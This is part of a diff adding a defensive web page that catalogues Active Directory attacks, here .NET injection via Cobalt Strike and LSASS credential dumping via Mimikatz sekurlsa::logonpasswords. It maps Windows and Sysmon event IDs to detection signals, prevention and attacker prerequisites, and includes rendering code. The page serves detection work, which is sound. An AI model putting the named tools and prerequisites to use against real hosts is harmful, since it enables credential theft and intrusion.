+    tool:"CobaltStrike execute-assembly / Invoke-PSInject",
+    eventIds:[],
+    sysmonEids:[7],
+    etwProviders:["DotNETRuntime (assembly + method names)"],
+    hasSplunk:false,
+    hasHoneypot:false,
+    sources:["Windows Event Logs"],
+    detection:"Sysmon EID 7: clr.dll/clrjit.dll loaded by process that never uses .NET (spoolsv, etc.)",
+    prevention:"Application whitelisting; monitor CLR loading in unexpected processes",
+    honeypot:"",
+    prereqs:"Existing code execution foothold on target machine · Admin or SYSTEM generally required to inject into another process's memory · Target host process must already be running · ETW patch or AMSI bypass often paired to avoid detection"
+  },
+  {
+    id:"lsassdump", name:"Credential Dumping (LSASS)", icon:"🧠",
+    cat:["cred"],
+    color:"red",
+    desc:"Read LSASS process memory to extract NTLM hashes, Kerberos tickets, cleartext passwords",
+    tool:"Mimikatz sekurlsa::logonpasswords",
+    eventIds:[],
+    sysmonEids:[10],
+    etwProviders:[],
+    hasSplunk:false,
+    hasHoneypot:false,
+    sources:["Windows Event Logs"],
+    detection:"Sysmon EID 10: TargetImage=lsass.exe, SourceImage from user dir, SourceUser != TargetUser",
+    prevention:"Credential Guard; Protected Users group; RunAsPPL for LSASS",
+    honeypot:"",
+    prereqs:"Local admin or SYSTEM on the target machine · LSASS must NOT be running as PPL (RunAsPPL registry key) · Credential Guard must NOT be enabled (virtualizes LSASS secrets) · At least one interactive or network logon session must be cached in LSASS memory"
+  }
+];
+
+const eventData = [
+  {id:"4624", desc:"Successful logon", src:"Security", attacks:["Golden Ticket","Pass-the-Hash (LogonType=9)","Silver Ticket","Constrained Delegation","Credentials in Shares"]},
+  {id:"4625", desc:"Failed logon", src:"Security", attacks:["Password Spraying","GPP Passwords (honeypot)","Credentials in Shares (honeypot)"]},
+  {id:"4648", desc:"Explicit credentials logon", src:"Security", attacks:["LLMNR Poisoning (captured creds used)"]},
+  {id:"4662", desc:"AD object access (replication)", src:"Security", attacks:["DCSync","Golden Ticket (krbtgt theft)"]},
+  {id:"4663", desc:"Object access (file read)", src:"Security", attacks:["GPP Passwords (SYSVOL XML honeypot)"]},
+  {id:"4768", desc:"TGT request (Kerberos)", src:"Security", notes:"High volume – filter by Pre_Auth_Type=0"},
+  {id:"4769", desc:"TGS request (Kerberos)", src:"Security", attacks:["Kerberoasting","Golden Ticket (no prior 4768)","Unconstrained Delegation"]},
+  {id:"4770", desc:"TGS renewal", src:"Security", attacks:["Pass-the-Ticket (renewal without prior TGT)"]},
+  {id:"4771", desc:"Kerberos pre-auth failed", src:"Security", attacks:["Password Spraying","AS-REProasting","GPP honeypot"]},
+  {id:"4724", desc:"Password reset attempt", src:"Security", attacks:["Object ACL abuse (GenericAll / ForceChangePassword)"]},
+  {id:"4725", desc:"User account disabled", src:"Security", attacks:["GPO honeypot (auto-disable response)"]},
+  {id:"4738", desc:"User account changed", src:"Security", attacks:["Object ACL abuse (add SPN for Kerberoasting)"]},
+  {id:"4742", desc:"Computer account changed", src:"Security", attacks:["DCShadow (GC/ SPN added to rogue DC)","Object ACL (computer object change)"]},
+  {id:"4776", desc:"NTLM credential validation", src:"Security", attacks:["Password Spraying","GPP honeypot","Credentials in Shares honeypot"]},
+  {id:"5136", desc:"AD directory object modified", src:"Security", attacks:["GPO Permissions abuse"]},
+  {id:"Sysmon EID 1", desc:"Process Create", src:"Sysmon", attacks:["Recon (native tools parent chain)","PPID Spoofing (shows spoofed parent)"]},
+  {id:"Sysmon EID 3", desc:"Network Connection", src:"Sysmon", attacks:["Overpass-the-Hash (port 88)","Constrained Delegation (Rubeus port 88)","C2 beacon"]},
+  {id:"Sysmon EID 7", desc:"Image Loaded", src:"Sysmon", attacks:["DLL Hijacking (Signed=false, outside System32)",".NET Injection (clr.dll in non-.NET process)"]},
+  {id:"Sysmon EID 10", desc:"Process Access", src:"Sysmon", attacks:["Credential Dumping (TargetImage=lsass.exe)","Pass-the-Hash (LSASS read precursor)","Golden Ticket (krbtgt via LSASS on DC)"]},
+  {id:"Sysmon EID 22", desc:"DNS Query", src:"Sysmon", attacks:["LLMNR Poisoning (honeypot hostname lookup)"]},
+];
+
+function renderCards(){
+  const grid = document.getElementById('attackGrid');
+  grid.innerHTML = '';
+  attacks.forEach(a => {
+    const colorMap = {red:'var(--red-d)',orange:'var(--orange-d)',blue:'var(--blue-d)'};
+    const borderMap = {red:'var(--red-b)',orange:'#6a3010',blue:'var(--blue-b)'};
+    const iconBg = colorMap[a.color]||'var(--bg3)';
+    const tags = [
+      ...a.eventIds.map(e=>`<span class="tag tag-event">${e}</span>`),
+      ...a.sysmonEids.map(e=>`<span class="tag tag-sysmon">Sysmon EID ${e}</span>`),
+      ...a.etwProviders.map(e=>`<span class="tag tag-etw">ETW</span>`),
+      a.hasSplunk?`<span class="tag tag-splunk">Splunk SPL</span>`:'',
+      ...a.sources.map(s=>`<span class="tag tag-source">${s}</span>`)
+    ].filter(Boolean).join('');
+
+    const hp = a.hasHoneypot?`<div class="honeypot-badge">&#x1F36F; Honeypot strategy available</div>`:'';
+
+    const detail = `
+      <div class="card-detail">
+        <div class="detail-grid">
+          <div class="detail-block" style="grid-column:1/-1;border-color:#4a3800;background:#1a1200">
+            <h5 style="color:var(--yellow)">&#x26A0; Prerequisites</h5><p>${a.prereqs||'—'}</p>
+          </div>
+          <div class="detail-block">
+            <h5>Tool / Method</h5><p>${a.tool}</p>
+          </div>
+          <div class="detail-block">
+            <h5>Detection Signal</h5><p>${a.detection}</p>
+          </div>
+          <div class="detail-block">
+            <h5>Prevention</h5><p>${a.prevention}</p>
+          </div>
+          <div class="detail-block">
+            <h5>${a.hasHoneypot?'Honeypot':'Notes'}</h5>
+            <p>${a.honeypot||'No honeypot documented for this attack.'}</p>
+          </div>
+        </div>
+        ${hp}
+      </div>`;
+
+    const card = document.createElement('div');
+    card.className = 'card';
+    card.dataset.cat = a.cat.join(' ');
+    card.dataset.splunk = a.hasSplunk;
+    card.dataset.honeypot = a.hasHoneypot;
+    card.dataset.sysmon = a.sysmonEids.length > 0;
+    card.innerHTML = `
+      <div class="card-header">
+        <div class="card-icon" style="background:${iconBg}">${a.icon}</div>
+        <div class="card-meta">
+          <h4>${a.name}</h4>
+          <div class="desc">${a.desc}</div>
+        </div>
+      </div>
+      <div class="card-tags">${tags}</div>
+      ${detail}`;
+    card.addEventListener('click',()=>card.classList.toggle('expanded'));
+    grid.appendChild(card);
+  });
+}
+
+function filterCards(type, btn){
+  document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  document.querySelectorAll('.card').forEach(c=>{
+    let show = false;
+    if(type==='all') show=true;
+    else if(type==='splunk') show = c.dataset.splunk==='true';
+    else if(type==='honeypot') show = c.dataset.honeypot==='true';
+    else if(type==='sysmon') show = c.dataset.sysmon==='true';
+    else show = c.dataset.cat.includes(type);
+    c.classList.toggle('hidden',!show);
+  });
+}
+
+function renderEventTable(){
+  const tbody = document.getElementById('eventTable');
+  eventData.forEach(e=>{
+    const attacks = (e.attacks||[]).map(a=>`<span class="atk-pill">${a}</span>`).join('');
+    const srcColor = e.src==='Sysmon'?'var(--purple)':e.src==='ETW'?'var(--orange)':'var(--green)';
+    tbody.innerHTML += `<tr>
+      <td><span class="eid">${e.id}</span></td>
+      <td>${e.desc}</td>
+      <td><span style="color:${srcColor};font-size:11px;font-weight:700">${e.src}</span></td>
+      <td><div class="attacks">${attacks}</div></td>
+      <td style="color:var(--muted);font-size:11px">${e.notes||''}</td>
+    </tr>`;
+  });
+}
+
+renderCards();
+renderEventTable();
+</script>
+</body>
+</html>
